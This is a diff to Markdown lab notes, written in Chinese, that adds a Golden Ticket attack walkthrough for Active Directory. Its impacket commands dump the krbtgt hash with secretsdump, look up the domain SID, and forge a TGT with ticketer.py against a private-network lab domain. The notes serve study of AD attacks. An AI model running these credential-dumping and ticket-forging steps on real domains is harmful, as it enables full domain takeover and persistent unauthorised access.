@@ -48,4 +48,21 @@ Pass the Ticket
     可瀏覽DC目錄
 ![image](https://github.com/user-attachments/assets/1495a602-6c57-4ff2-a1a8-67af5b4b1227)
 
+Golden Ticket Attack
+---
+    /etc/hosts新增IP&域名
+![image](https://github.com/user-attachments/assets/cd32ab86-fca6-447e-bda6-ede7ce144113)
+
+    取得administrator的krbtgt的NTLM hash
+    impacket-secretsdump 'administrator:Pa$$w0rd'@192.168.177.19    
+![image](https://github.com/user-attachments/assets/164b2a01-4163-4cef-a8db-4f4b19f663a5)
+
+    取得administrator的SID
+    python3 /opt/impacket/examples/lookupsid.py 'administrator:Pa$$w0rd'@192.168.177.19 0
+![image](https://github.com/user-attachments/assets/3ec80a6d-4cce-406a-84af-28f25dff7e05)
+
+    簽一張TGT
+    python3 /opt/impacket/examples/ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain lpt.com evil
+![image](https://github.com/user-attachments/assets/1e063263-9b10-4248-8545-09fb0828fe89)
+
 
